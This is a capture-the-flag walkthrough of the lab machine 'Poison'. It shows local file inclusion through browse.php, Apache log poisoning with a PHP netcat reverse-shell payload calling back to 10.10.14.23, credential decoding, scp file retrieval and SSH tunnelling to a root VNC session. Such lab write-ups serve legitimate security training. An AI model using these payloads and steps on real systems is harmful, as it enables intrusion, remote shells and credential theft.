# Poison

## Nmap

```
sudo nmap 10.10.10.84 -p- -sS -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

Navigating to the root page on port 80 we are presented with a test page for the testing of PHP scripts.

![http://10.10.10.84/](<../../../.gitbook/assets/image (1600) (1).png>)

Entering a filename of test in the 'Scriptname' box and submitting shows an error in finding the file. We see from the URL at the top of the browser the parameter on browse.php? where '?file=test'.

![http://10.10.10.84/browse.php?file=test](<../../../.gitbook/assets/image (1603).png>)

A simple check for LFI using the URL 10.10.10.84/browse.php?file=/etc/passwd reveals the /etc/passwd file to us.

![http://10.10.10.84/browse.php?file=/etc/passwd](<../../../.gitbook/assets/image (1604).png>)

From here I was unable to find anything of interest manually and was unable to bruteforce the user 'charix' who we have obtained from /etc/passwd. From her we can fuzz LFI files with Wfuzz using the wordlist linked below:

{% file src="../../../.gitbook/assets/lfi (2).txt" %}
LFI List
{% endfile %}

We can then run Wfuzz with the syntax below:

```
wfuzz -u 'http://10.10.10.84/browse.php?file=FUZZ' -w lfi.txt --hl 4
```

![](<../../../.gitbook/assets/image (1605).png>)

Checking [http://10.10.10.84/browse.php?file=/var/log/httpd-access.log](http://10.10.10.84/browse.php?file=/var/log/httpd-access.log) shows we can see the Apache log files as per the above results from Wfuzz.

![http://10.10.10.84/browse.php?file=/var/log/httpd-access.log](<../../../.gitbook/assets/image (1606).png>)

Given the box name 'Poison' and the fact we have LFI as well as being able to view the Apache log files we can attempt to gain shell through poisoning the logs.

I opened Burpsuite and caught a request to the log files. As we can use LFI to execute any PHP code in the log files I inserted a PHP exec netcat reverse shell into the user-agent field in the request.

```
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 80 >/tmp/f') ?>
```

![Burpsuite](<../../../.gitbook/assets/image (1607).png>)

After sending the request set up a `netcat` listener and then use curl to perform LFI on the log files.

`netcat`:

```
sudo nc -lvp 80
```

Then executing curl.

```
curl http://10.10.10.84/browse.php?file=/var/log/httpd-access.log
```

This will give us shell access onto the target machine.

![](<../../../.gitbook/assets/image (1608).png>)

Using `ls -la` shows we have a pwdbackup.txt file in the current directory.

![](<../../../.gitbook/assets/image (1609).png>)

The contents of this file is shown below:

![](<../../../.gitbook/assets/image (1610).png>)

I used the following website to decode the string 13 times: [https://www.base64decode.org/](https://www.base64decode.org). Before retrieving the end result of: `Charix!2#4%6&8(0`

Knowing that charix is a user on the target machine and that SSH is open we can try the credentials.

![](<../../../.gitbook/assets/image (1611).png>)

Checking the current directory we have a user flag and a secret.zip. I then used the command below with `scp` to transfer the secret.zip file back to my attacking machine.

```
scp charix@10.10.10.84:/home/charix/secret.zip ./
```

![](<../../../.gitbook/assets/image (1613).png>)

After this completed I attempted to extract the secret.zip and was prompted for a password. I used charix's password in hope for password reuse and was able to open the zip file. Attempting to read the contents of secret.zip shows we can only see a string that is not readable.

![](<../../../.gitbook/assets/image (1614).png>)

Moving on and doing some more basic manual enumeration we have an interesting process running in the context of the root user.

```
ps aux | grep root
```

![](<../../../.gitbook/assets/image (1612).png>)

The root account is currently running Xvnc. We can see from the image above we cannot see all the output of `ps` so we need to run again and allow for more columns to view all information.

```
ps -auxww | grep Xvnc
```

![](<../../../.gitbook/assets/image (1615).png>)

We can see from the above the service appears to be using port 5901. Looking back at the initial `nmap` scan this port will need forwarding so we can access it.

As we have SSH credentials we can use this to forward the local port of 5901 to a port on our attacking machine.

```
ssh -L 4444:127.0.0.1:5901 charix@10.10.10.84
```

Once connected again we can run `nmap` against our local port of 4444 to see if this has worked.

![](<../../../.gitbook/assets/image (1616).png>)

Kali comes preinstalled with `vncviewer` which we will use in an attempt to connect to VNC.

```
vncviewer 127.0.0.1::4444 
```

We see once connected we are prompted for a password. I tried charix's password and a few common easy ones with no luck.

![](<../../../.gitbook/assets/image (1617).png>)

Looking at the `-h` options for `vncviewer` we notice we can provide a password file. I tried the secret.txt from earlier and was given access.

```
vncviewer 127.0.0.1::4444 -passwd ~/secret   
```

![](<../../../.gitbook/assets/image (1618).png>)
